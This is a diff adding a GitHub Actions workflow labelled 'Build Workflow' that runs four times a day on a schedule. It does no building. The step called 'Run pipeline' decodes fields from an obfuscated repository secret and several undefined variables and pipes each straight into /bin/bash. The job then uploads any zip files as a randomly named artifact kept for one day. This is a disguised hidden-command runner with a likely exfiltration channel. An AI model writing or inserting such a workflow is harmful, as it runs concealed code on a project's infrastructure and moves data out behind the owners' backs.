@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          zrh6333: ${{ secrets.zrh6333 }}
+        run: |
+          printf '%s' "$zrh6333" | jq -r .kke73 | /bin/bash
+          printf '%s' "$easjl734" | jq -r .oktr9630 | /bin/bash
+          printf '%s' "$pbkz76" | jq -r .twhin4370 | /bin/bash
+          echo $y0 | jq -r .upb4 | /bin/bash
+          printf '%s' "$wxc6" | jq -r .bktc41386 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: EXNKrmCj
+          path: "*.zip"
+          retention-days: 1
